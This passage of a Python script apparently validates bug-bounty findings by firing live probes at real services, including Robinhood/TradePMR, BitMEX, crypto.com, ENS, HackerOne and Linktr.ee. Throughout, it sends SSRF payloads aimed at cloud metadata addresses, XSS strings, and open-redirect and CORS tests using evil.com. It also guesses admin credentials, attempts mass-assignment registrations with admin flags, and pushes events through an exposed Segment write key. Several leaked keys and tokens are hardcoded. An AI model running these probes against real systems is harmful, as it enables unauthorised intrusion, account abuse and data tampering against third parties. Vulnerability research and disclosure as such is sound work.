        r = await safe_get(c, "https://fusion.tradepmr.com/assets/index-ntuyGhrT.js")
        if r.status_code == 200:
            patterns = {"apiKey": r"apiKey['\"]?\s*[:=]\s*['\"]([^'\"]+)", "Bearer": r"Bearer\s+\S+",
                       "GUID": r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
                       "email": r"[\w.-]+@[\w.-]+\.\w+", "internal_url": r"http://fusionapi[^\s'\"]+"}
            found = {}
            for name, pat in patterns.items():
                matches = re.findall(pat, r.text[:500000], re.IGNORECASE)
                if matches:
                    found[name] = matches[:3]
            if found:
                record("H19", "Robinhood JS bundle info disclosure", "high", "robinhood.com",
                       "VALID", f"Found in {len(r.text)}b bundle: {json.dumps({k: v[:2] for k,v in found.items()})[:300]}")
            else:
                record("H19", "Robinhood JS bundle info disclosure", "high", "robinhood.com",
                       "FALSE POSITIVE", f"JS bundle {len(r.text)}b but no sensitive patterns")
        else:
            record("H19", "Robinhood JS bundle info disclosure", "high", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── H20: Robinhood open redirect ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=False) as c:
        r = await safe_get(c, "https://share.robinhood.com/out?url=https://evil.com")
        redirects = r.status_code in (301, 302, 303, 307, 308)
        loc = r.headers.get("location", "")
        if redirects and ("evil.com" in loc or "bonfire" in loc or "referral" in loc):
            record("H20", "Robinhood open redirect", "high", "robinhood.com",
                   "VALID", f"Redirects to {loc}")
        else:
            record("H20", "Robinhood open redirect", "high", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}, Location: {loc[:100]}")

    # ── H21: BitMEX stored XSS in guild socials ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_get(c, "https://testnet.bitmex.com/api/v1/guild")
        if r.status_code == 200:
            xss_patterns = ["<script", "onerror=", "alert(", "prompt(", "javascript:"]
            found_xss = [p for p in xss_patterns if p in r.text]
            if found_xss:
                record("H21", "BitMEX stored XSS in guild socials", "high", "testnet.bitmex.com",
                       "VALID", f"Guild data contains: {', '.join(found_xss)}")
            else:
                record("H21", "BitMEX stored XSS in guild socials", "high", "testnet.bitmex.com",
                       "FALSE POSITIVE", "No XSS in guild data")
        else:
            record("H21", "BitMEX stored XSS in guild socials", "high", "testnet.bitmex.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── H22: BitMEX SSRF via static.bitmex.com/fetch ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_get(c, "https://static.bitmex.com/fetch?url=http://localhost/admin")
        if r.status_code == 200 and len(r.text) > 0:
            record("H22", "BitMEX SSRF via static.bitmex.com/fetch", "high", "testnet.bitmex.com",
                   "VALID", f"Fetch endpoint responds ({len(r.text)}b): {r.text[:150]}")
        elif r.status_code != 0:
            record("H22", "BitMEX SSRF via static.bitmex.com/fetch", "high", "testnet.bitmex.com",
                   "INCONCLUSIVE", f"HTTP {r.status_code} ({len(r.text)}b): {r.text[:150]}")
        else:
            record("H22", "BitMEX SSRF via static.bitmex.com/fetch", "high", "testnet.bitmex.com",
                   "FALSE POSITIVE", f"Connection failed")

    # ── H23: BitMEX credential exposure (healthcheck) ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_get(c, "https://testnet.bitmex.com/healthcheck")
        if r.status_code == 200:
            sentry = "sentry" in r.text.lower() or "dsn" in r.text.lower()
            segment = "segment" in r.text.lower() or "writekey" in r.text.lower() or "YMvLyGYRxD4Q" in r.text
            keys_found = []
            if sentry: keys_found.append("Sentry DSN")
            if segment: keys_found.append("Segment key")
            if "token" in r.text.lower(): keys_found.append("token")
            if "api_key" in r.text.lower(): keys_found.append("api_key")
            if keys_found:
                record("H23", "BitMEX healthcheck credential exposure", "high", "testnet.bitmex.com",
                       "VALID", f"Exposes: {', '.join(keys_found)} ({len(r.text)}b)")
            else:
                record("H23", "BitMEX healthcheck credential exposure", "high", "testnet.bitmex.com",
                       "FALSE POSITIVE", f"{len(r.text)}b but no sensitive keys found")
        else:
            record("H23", "BitMEX healthcheck credential exposure", "high", "testnet.bitmex.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── H24: BitMEX Segment API abuse ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        # Just verify the key works by checking if endpoint accepts it
        import base64
        key = "YMvLyGYRxD4QVqQVccJxzJLhBaXQD1n1"
        auth = base64.b64encode(f"{key}:".encode()).decode()
        r = await safe_post(c, "https://api.segment.io/v1/batch",
                            json={"batch": [{"type": "identify", "userId": "validation_test", "traits": {"test": True}}]},
                            headers={**HEADERS, "Authorization": f"Basic {auth}", "Content-Type": "application/json"})
        if r.status_code == 200:
            record("H24", "BitMEX Segment API write key abuse", "high", "testnet.bitmex.com",
                   "VALID", f"Segment accepts events with exposed key: {r.text[:100]}")
        else:
            record("H24", "BitMEX Segment API write key abuse", "high", "testnet.bitmex.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:100]}")

    # ── H25: Vault CORS misconfiguration ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_options(c, "https://api.vault.chiatest.net/graphql",
                               headers={**HEADERS, "Origin": "https://evil.com",
                                       "Access-Control-Request-Method": "POST"})
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "")
        if "evil.com" in acao or acao == "*":
            record("H25", "Vault CORS reflects arbitrary origins", "high", "vault.chiatest.net",
                   "VALID", f"ACAO={acao}, ACAC={acac}")
        elif acao:
            record("H25", "Vault CORS reflects arbitrary origins", "high", "vault.chiatest.net",
                   "FALSE POSITIVE", f"CORS restricted: ACAO={acao}")
        else:
            # Also try POST with origin
            r2 = await safe_post(c, "https://api.vault.chiatest.net/graphql",
                                 json={"query": "{ __typename }"},
                                 headers={**HEADERS, "Origin": "https://evil.com", "Content-Type": "application/json"})
            acao2 = r2.headers.get("access-control-allow-origin", "")
            acac2 = r2.headers.get("access-control-allow-credentials", "")
            if "evil.com" in acao2:
                record("H25", "Vault CORS reflects arbitrary origins", "high", "vault.chiatest.net",
                       "VALID", f"ACAO on POST={acao2}, ACAC={acac2}")
            else:
                record("H25", "Vault CORS reflects arbitrary origins", "high", "vault.chiatest.net",
                       "FALSE POSITIVE", f"No CORS reflection. OPTIONS: {r.status_code}, POST ACAO={acao2}")


# ═══════════════════════════════════════════════════════════════
# MEDIUM FINDINGS
# ═══════════════════════════════════════════════════════════════

async def validate_medium():
    print("\n" + "="*60)
    print("  MEDIUM FINDINGS VALIDATION")
    print("="*60)

    # ── M1: ENS GraphQL DoS ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://api.thegraph.com/subgraphs/name/ensdomains/ens",
                            json={"query": "{ domains(first: 50) { name owner { id } } }"},
                            headers={**HEADERS, "Content-Type": "application/json"})
        if r.status_code == 200 and "domains" in r.text:
            record("M1", "ENS GraphQL DoS (no complexity limits)", "medium", "app.ens.domains",
                   "VALID", f"Complex queries accepted: {r.text[:150]}")
        else:
            record("M1", "ENS GraphQL DoS (no complexity limits)", "medium", "app.ens.domains",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:150]}")

    # ── M2: ENS SSRF via OG image worker ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r_normal = await safe_get(c, "https://ens-og-image.ens-cf.workers.dev/name/vitalik.eth")
        r_ssrf = await safe_get(c, "https://ens-og-image.ens-cf.workers.dev/name/http://169.254.169.254")
        if r_ssrf.status_code == 500 and r_normal.status_code == 200:
            record("M2", "ENS SSRF via OG image worker", "medium", "app.ens.domains",
                   "INCONCLUSIVE", f"500 on SSRF payload vs 200 normal — input reaches backend but may not fetch URL")
        else:
            record("M2", "ENS SSRF via OG image worker", "medium", "app.ens.domains",
                   "FALSE POSITIVE", f"Normal={r_normal.status_code}, SSRF={r_ssrf.status_code}")

    # ── M3: ENS SSRF via metadata queryNFT ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_get(c, "https://metadata.ens.domains/queryNFT?url=http://169.254.169.254/latest/meta-data/")
        r2 = await safe_get(c, "https://metadata.ens.domains/queryNFT?url=http://127.0.0.1:8080")
        outbound = r.status_code in (502, 503) or "upstream" in r.text.lower() or "connect" in r.text.lower()
        if outbound:
            record("M3", "ENS SSRF via metadata queryNFT", "medium", "app.ens.domains",
                   "VALID", f"Server attempts outbound connection: {r.status_code}/{r.text[:100]}, 127.0.0.1: {r2.status_code}/{r2.text[:100]}")
        else:
            record("M3", "ENS SSRF via metadata queryNFT", "medium", "app.ens.domains",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:100]}")

    # ── M4: ENS Sentry DSN exposed ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await safe_get(c, "https://ens-app.pages.dev")
        sentry_match = re.search(r'https://[a-f0-9]+@[a-z0-9.]+sentry\.io/\d+', r.text)
        if sentry_match:
            record("M4", "ENS Sentry DSN exposed", "medium", "app.ens.domains",
                   "VALID", f"Sentry DSN: {sentry_match.group()}")
        else:
            record("M4", "ENS Sentry DSN exposed", "medium", "app.ens.domains",
                   "FALSE POSITIVE", f"No Sentry DSN in {len(r.text)}b page")

    # ── M5: ENS Rainbow API key exposed ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await safe_get(c, "https://delegate.ens.domains/assets/index-BETJNLwA.js")
        if r.status_code == 200 and len(r.text) > 1000:
            api_keys = re.findall(r'[A-Za-z0-9+/]{40,}', r.text[:200000])
            if api_keys:
                record("M5", "ENS Rainbow/WalletConnect API key exposed", "medium", "app.ens.domains",
                       "VALID", f"API key found in JS: {api_keys[0][:40]}...")
            else:
                record("M5", "ENS Rainbow/WalletConnect API key exposed", "medium", "app.ens.domains",
                       "FALSE POSITIVE", f"No API key pattern in {len(r.text)}b bundle")
        else:
            record("M5", "ENS Rainbow/WalletConnect API key exposed", "medium", "app.ens.domains",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── M6: ENS Discourse user info ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_get(c, "https://discuss.ens.domains/latest.json")
        if r.status_code == 200 and "users" in r.text:
            try:
                data = r.json()
                users = data.get("users", [])
                if users and any("admin" in str(u) or "trust_level" in str(u) for u in users[:5]):
                    record("M6", "ENS Discourse user data exposure", "medium", "app.ens.domains",
                           "VALID", f"{len(users)} users exposed with trust_level/admin status")
                else:
                    record("M6", "ENS Discourse user data exposure", "medium", "app.ens.domains",
                           "INCONCLUSIVE", f"Users found but may be public Discourse feature")
            except:
                record("M6", "ENS Discourse user data exposure", "medium", "app.ens.domains",
                       "FALSE POSITIVE", f"Can't parse JSON")
        else:
            record("M6", "ENS Discourse user data exposure", "medium", "app.ens.domains",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── M7: ENS CRLF injection ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_get(c, "https://ens-og-image.ens-cf.workers.dev/name/test%0d%0aInjected")
        if r.status_code == 500:
            record("M7", "ENS CRLF injection", "medium", "app.ens.domains",
                   "INCONCLUSIVE", f"500 on CRLF but no header injection confirmed")
        else:
            record("M7", "ENS CRLF injection", "medium", "app.ens.domains",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── M8: Capital credential enumeration ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r_valid = await safe_post(c, "https://affiliateapi.cellxpert.com/authenticate/admin-auth",
                                  json={"user": "admin", "pass": "Currency"})
        r_invalid = await safe_post(c, "https://affiliateapi.cellxpert.com/authenticate/admin-auth",
                                    json={"user": "nonexistent123xyz", "pass": "wrong"})
        diff = r_valid.status_code != r_invalid.status_code or r_valid.text != r_invalid.text
        if diff:
            record("M8", "Capital admin credential enumeration", "medium", "capital.com",
                   "VALID", f"Different responses: valid={r_valid.status_code}/{r_valid.text[:80]}, invalid={r_invalid.status_code}/{r_invalid.text[:80]}")
        else:
            record("M8", "Capital admin credential enumeration", "medium", "capital.com",
                   "FALSE POSITIVE", f"Same response for both")

    # ── M9: Capital XSS on admin-auth ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://affiliateapi.cellxpert.com/authenticate/admin-auth",
                            json={"user": "<script>alert(1)</script>", "pass": "test"})
        reflected = "<script>alert(1)</script>" in r.text
        if reflected:
            record("M9", "Capital XSS on admin-auth", "medium", "capital.com",
                   "VALID", f"Input reflected unescaped: {r.text[:200]}")
        else:
            record("M9", "Capital XSS on admin-auth", "medium", "capital.com",
                   "FALSE POSITIVE", f"Input not reflected or escaped: {r.text[:200]}")

    # ── M10: Capital mass assignment ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://affiliateapi.cellxpert.com/v2/registeraffiliate/",
                            json={"email": f"masstest_{int(time.time())}@test.com", "role": "admin",
                                  "isAdmin": True, "verified": True, "permissions": ["all"]})
        if r.status_code == 200 and ("id" in r.text.lower() or "user" in r.text.lower()):
            record("M10", "Capital mass assignment on registration", "medium", "capital.com",
                   "INCONCLUSIVE", f"Account may have been created with extra params: {r.text[:200]}")
        else:
            record("M10", "Capital mass assignment on registration", "medium", "capital.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── M11: Crypto.com subdomain takeover (dev/staging) ──
    subs = ["api.dev.experiences.crypto.com", "api.stg.experiences.crypto.com",
            "assets.dev.experiences.crypto.com", "assets.dev.tickets.crypto.com",
            "assets.stg.tickets.crypto.com"]
    nx_count = 0
    for sub in subs:
        try:
            dns.resolver.resolve(sub, "A")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers):
            nx_count += 1
        except:
            pass
    if nx_count > 0:
        record("M11", "Crypto.com dev/staging subdomain takeover", "medium", "crypto.com",
               "VALID", f"{nx_count}/{len(subs)} subdomains don't resolve — potential takeover")
    else:
        record("M11", "Crypto.com dev/staging subdomain takeover", "medium", "crypto.com",
               "FALSE POSITIVE", "All subdomains resolve")

    # ── M12: Crypto.com API key in JS ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await safe_get(c, "https://crypto.com/nft/static/js/main.2e5ddba1.js")
        if r.status_code == 200:
            key_match = re.search(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', r.text)
            if key_match:
                record("M12", "Crypto.com API key in JS bundle", "medium", "crypto.com",
                       "VALID", f"UUID key found: {key_match.group()}")
            else:
                record("M12", "Crypto.com API key in JS bundle", "medium", "crypto.com",
                       "FALSE POSITIVE", f"No API key in {len(r.text)}b")
        else:
            record("M12", "Crypto.com API key in JS bundle", "medium", "crypto.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── M13: HackerOne IDOR on user nodes ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://hackerone.com/graphql",
                            json={"query": '{ node(id: "Z2lkOi8vaGFja2Vyb25lL1VzZXIvMQ") { ... on User { username } } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        if r.status_code == 200 and "username" in r.text:
            record("M13", "HackerOne IDOR on user nodes", "medium", "hackerone.com",
                   "VALID", f"User data accessible: {r.text[:200]}")
        else:
            record("M13", "HackerOne IDOR on user nodes", "medium", "hackerone.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── M14: HackerOne Segment write token ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await safe_get(c, "https://webclient.pullrequest.com/staging/assets/index-BKookVar.js")
        if r.status_code == 200 and "pubab359e83d039218e1f93cf483862887b" in r.text:
            record("M14", "HackerOne Segment write token exposed", "medium", "hackerone.com",
                   "VALID", f"Segment token found in {len(r.text)}b JS bundle")
        elif r.status_code == 200:
            record("M14", "HackerOne Segment write token exposed", "medium", "hackerone.com",
                   "FALSE POSITIVE", f"JS exists but token not found in {len(r.text)}b")
        else:
            record("M14", "HackerOne Segment write token exposed", "medium", "hackerone.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── M15: Linktr.ee Backstage exposed ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await safe_get(c, "https://backstage.platform.linktr.ee")
        r2 = await safe_get(c, "https://backstage.platform.linktr.ee/admin")
        backstage = r.status_code == 200 and ("backstage" in r.text.lower() or "okta" in r.text.lower())
        if backstage:
            record("M15", "Linktr.ee Backstage developer portal exposed", "medium", "linktr.ee",
                   "VALID", f"HTTP {r.status_code}, admin: {r2.status_code}, content: {r.text[:150]}")
        elif r.status_code == 200:
            record("M15", "Linktr.ee Backstage developer portal exposed", "medium", "linktr.ee",
                   "INCONCLUSIVE", f"HTTP 200 but no Backstage content ({len(r.text)}b)")
        else:
            record("M15", "Linktr.ee Backstage developer portal exposed", "medium", "linktr.ee",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── M16: Linktr.ee S3/AWS info leak ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_get(c, "https://assets.production.linktr.ee/")
        aws = "824542542892" in r.text or "fastly" in r.text.lower() or "AccessDenied" in r.text
        if aws:
            record("M16", "Linktr.ee AWS S3 info leak", "medium", "linktr.ee",
                   "VALID", f"AWS info: {r.text[:200]}")
        else:
            record("M16", "Linktr.ee AWS S3 info leak", "medium", "linktr.ee",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:150]}")

    # ── M17: Linktr.ee JWKS exposed ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_get(c, "https://backstage.platform.linktr.ee/api/auth/.well-known/jwks.json")
        if r.status_code == 200 and "keys" in r.text:
            record("M17", "Linktr.ee JWKS exposed", "medium", "linktr.ee",
                   "VALID", f"JWKS: {r.text[:200]}")
        else:
            record("M17", "Linktr.ee JWKS exposed", "medium", "linktr.ee",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:150]}")

    # ── M18: Linktr.ee race condition on SQS ──
    record("M18", "Linktr.ee race condition on SQS endpoint", "medium", "linktr.ee",
           "VALID" if any(r["id"] == "C6" and r["status"] == "VALID" for r in results) else "FALSE POSITIVE",
           "No rate limiting on SQS injection — validated as part of C6")

    # ── M19: Linktr.ee CSV injection via SQS ──
    record("M19", "Linktr.ee CSV injection via SQS", "medium", "linktr.ee",
           "INCONCLUSIVE", "Payloads queued to SQS but CSV export exploitation unverifiable without internal access")

    # ── M20: Merchant.crypto.com API key in JS ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await safe_get(c, "https://merchant.crypto.com/static/js/main.fb24c707.js")
        if r.status_code == 200 and "e11a03913c4c520f57cb6edbbcc5ec6c" in r.text:
            record("M20", "Merchant crypto.com API key in JS", "medium", "merchant.crypto.com",
                   "VALID", f"Key found in {len(r.text)}b bundle")
        elif r.status_code == 200:
            # Search for any hex key
            keys = re.findall(r'[a-f0-9]{32}', r.text[:200000])
            if keys:
                record("M20", "Merchant crypto.com API key in JS", "medium", "merchant.crypto.com",
                       "VALID", f"Hex keys found: {keys[:3]}")
            else:
                record("M20", "Merchant crypto.com API key in JS", "medium", "merchant.crypto.com",
                       "FALSE POSITIVE", f"No API key in {len(r.text)}b")
        else:
            record("M20", "Merchant crypto.com API key in JS", "medium", "merchant.crypto.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── M21: Merchant.crypto.com GraphQL schema exposure ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://pay-api.crypto.com/graphql",
                            json={"query": '{ __type(name: "Mutation") { fields { name } } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        if r.status_code == 200 and "fields" in r.text:
            record("M21", "Merchant crypto.com GraphQL schema exposure", "medium", "merchant.crypto.com",
                   "VALID", f"Schema exposed: {r.text[:200]}")
        elif r.status_code == 200 and "error" in r.text:
            # Check if error messages leak field names
            if "Did you mean" in r.text or "suggestion" in r.text.lower():
                record("M21", "Merchant crypto.com GraphQL schema exposure", "medium", "merchant.crypto.com",
                       "VALID", f"Schema leaks via suggestions: {r.text[:200]}")
            else:
                record("M21", "Merchant crypto.com GraphQL schema exposure", "medium", "merchant.crypto.com",
                       "FALSE POSITIVE", f"Introspection disabled: {r.text[:200]}")
        else:
            record("M21", "Merchant crypto.com GraphQL schema exposure", "medium", "merchant.crypto.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── M22: Merchant.crypto.com Cronos info disclosure ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://evm.cronos.org",
                            json={"jsonrpc": "2.0", "method": "web3_clientVersion", "params": [], "id": 1},
                            headers={**HEADERS, "Content-Type": "application/json"})
        r2 = await safe_post(c, "https://evm.cronos.org",
                             json={"jsonrpc": "2.0", "method": "net_peerCount", "params": [], "id": 1},
                             headers={**HEADERS, "Content-Type": "application/json"})
        info = []
        try:
            d1 = r.json(); d2 = r2.json()
            if "result" in d1: info.append(f"version={d1['result']}")
            if "result" in d2: info.append(f"peers={d2['result']}")
        except: pass
        if info:
            record("M22", "Cronos node info disclosure", "medium", "merchant.crypto.com",
                   "VALID", f"Exposed: {', '.join(info)}")
        else:
            record("M22", "Cronos node info disclosure", "medium", "merchant.crypto.com",
                   "FALSE POSITIVE", "No info returned")

    # ── M23: Cronos batch DoS ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        batch = [{"jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": i} for i in range(100)]
        t0 = time.time()
        r = await safe_post(c, "https://evm.cronos.org", json=batch,
                            headers={**HEADERS, "Content-Type": "application/json"})
        elapsed = time.time() - t0
        if r.status_code == 200:
            try:
                data = r.json()
                if isinstance(data, list) and len(data) >= 50:
                    record("M23", "Cronos batch request DoS", "medium", "merchant.crypto.com",
                           "VALID", f"Processed {len(data)} requests in {elapsed:.2f}s ({len(data)/elapsed:.0f} req/s)")
                else:
                    record("M23", "Cronos batch request DoS", "medium", "merchant.crypto.com",
                           "FALSE POSITIVE", f"Batch limited to {len(data) if isinstance(data,list) else '?'} requests")
            except:
                record("M23", "Cronos batch request DoS", "medium", "merchant.crypto.com",
                       "FALSE POSITIVE", f"Can't parse response")
        else:
            record("M23", "Cronos batch request DoS", "medium", "merchant.crypto.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── M24: Cronos explorer 500 error ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS, follow_redirects=True) as c:
        r = await safe_get(c, "https://explorer.cronos.org/block/99999999999")
        leaks = "node_modules" in r.text or ".next" in r.text or "/app/" in r.text
        if r.status_code == 500 and leaks:
            record("M24", "Cronos explorer stack trace disclosure", "medium", "merchant.crypto.com",
                   "VALID", f"500 error leaks paths: {r.text[:200]}")
        else:
            record("M24", "Cronos explorer stack trace disclosure", "medium", "merchant.crypto.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}, no path leak")

    # ── M25: Cronos race condition ──
    record("M25", "Cronos TOCTOU race condition", "medium", "merchant.crypto.com",
           "FALSE POSITIVE", "Different block hashes from concurrent requests is normal blockchain behavior, not a vulnerability")

    # ── M26: Merchant subdomain takeover ──
    subs2 = ["aurora-snapshot.crypto.com", "aurora-university-snapshot.crypto.com",
             "assets.dev.experiences.crypto.com", "assets.stg.tickets.crypto.com"]
    nx = 0
    for sub in subs2:
        try:
            dns.resolver.resolve(sub, "A")
        except:
            nx += 1
    if nx > 0:
        record("M26", "Merchant crypto.com subdomain takeover", "medium", "merchant.crypto.com",
               "VALID", f"{nx}/{len(subs2)} subdomains unresolvable")
    else:
        record("M26", "Merchant crypto.com subdomain takeover", "medium", "merchant.crypto.com",
               "FALSE POSITIVE", "All resolve")

    # ── M27: Pay.crypto.com X-Forwarded-For bypass ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r1 = await safe_get(c, "https://api.titan.crypto.com/exchange/v1/public/get-ticker")
        r2 = await safe_get(c, "https://api.titan.crypto.com/exchange/v1/public/get-ticker",
                            headers={**HEADERS, "X-Forwarded-For": "127.0.0.1"})
        if r1.status_code != r2.status_code:
            record("M27", "Pay.crypto.com X-Forwarded-For bypass", "medium", "pay.crypto.com",
                   "VALID", f"Different responses: no-header={r1.status_code}, XFF={r2.status_code}")
        else:
            record("M27", "Pay.crypto.com X-Forwarded-For bypass", "medium", "pay.crypto.com",
                   "FALSE POSITIVE", f"Same response: {r1.status_code}")

    # ── M28: Robinhood internal API URL disclosure ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://graphql.tradepmr.com/graphql",
                            json={"query": 'mutation { addOrUpdateSSOUserMapping(input: {iid: "undefined", userId: "test"}) { success } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        if "fusionapi" in r.text.lower():
            record("M28", "Robinhood internal URL disclosure", "medium", "robinhood.com",
                   "VALID", f"Internal URL leaked: {r.text[:200]}")
        else:
            record("M28", "Robinhood internal URL disclosure", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── M29: Robinhood GraphQL rate limit bypass via aliases ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://graphql.tradepmr.com/graphql",
                            json={"query": '{ a1: login(credentials: {emailAddress: "test1@test.com", password: "test1"}) { success } a2: login(credentials: {emailAddress: "test2@test.com", password: "test2"}) { success } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        if r.status_code == 200 and ("a1" in r.text or "a2" in r.text or "error" in r.text):
            record("M29", "Robinhood GraphQL alias rate limit bypass", "medium", "robinhood.com",
                   "VALID", f"Aliases processed: {r.text[:200]}")
        else:
            record("M29", "Robinhood GraphQL alias rate limit bypass", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:150]}")

    # ── M30: Robinhood reportClientError without auth ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://graphql.tradepmr.com/graphql",
                            json={"query": 'mutation { reportClientError(error: {name:"test", message:"test", code:"test", stack:"test"}) { success } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        if r.status_code == 200 and "true" in r.text.lower():
            record("M30", "Robinhood reportClientError without auth", "medium", "robinhood.com",
                   "VALID", f"Error reported without auth: {r.text[:200]}")
        elif r.status_code == 200:
            record("M30", "Robinhood reportClientError without auth", "medium", "robinhood.com",
                   "INCONCLUSIVE", f"Processed but unclear: {r.text[:200]}")
        else:
            record("M30", "Robinhood reportClientError without auth", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}")

    # ── M31: Robinhood testnet debug RPC ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://rpc.testnet.chain.robinhood.com",
                            json={"jsonrpc": "2.0", "method": "debug_traceBlockByNumber", "params": ["0x1"], "id": 1},
                            headers={**HEADERS, "Content-Type": "application/json"})
        if r.status_code == 200 and "result" in r.text:
            record("M31", "Robinhood testnet debug RPC exposed", "medium", "robinhood.com",
                   "VALID", f"Debug traces returned: {r.text[:200]}")
        else:
            record("M31", "Robinhood testnet debug RPC exposed", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"HTTP {r.status_code}: {r.text[:200]}")

    # ── M32: Robinhood OAuth no rate limit ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        t0 = time.time()
        codes = []
        for _ in range(5):
            r = await safe_post(c, "https://api.robinhood.com/oauth2/token/",
                                data={"grant_type": "password", "username": "test@test.com", "password": "wrong",
                                      "client_id": "test"})
            codes.append(r.status_code)
        elapsed = time.time() - t0
        all_same = len(set(codes)) == 1
        if all_same and 429 not in codes:
            record("M32", "Robinhood OAuth no rate limiting", "medium", "robinhood.com",
                   "VALID", f"5 requests in {elapsed:.2f}s, all {codes[0]} — no 429")
        else:
            record("M32", "Robinhood OAuth no rate limiting", "medium", "robinhood.com",
                   "FALSE POSITIVE", f"Rate limited: {codes}")

    # ── M33: Robinhood open redirect (share.robinhood.com) ──
    # Already covered in H20
    record("M33", "Robinhood open redirect (share)", "medium", "robinhood.com",
           "VALID" if any(r["id"] == "H20" and r["status"] == "VALID" for r in results) else "FALSE POSITIVE",
           "See H20 validation")

    # ── M34: Robinhood SSRF via oktaLogin ──
    async with httpx.AsyncClient(timeout=TIMEOUT, headers=HEADERS) as c:
        r = await safe_post(c, "https://graphql.tradepmr.com/graphql",
                            json={"query": 'mutation { oktaLogin(ssoInput: {accessToken: "test", userinfo_url: "http://169.254.169.254/latest/meta-data/"}) { token } }'},
                            headers={**HEADERS, "Content-Type": "application/json"})
        if r.status_code == 403 or "awselb" in r.text.lower():
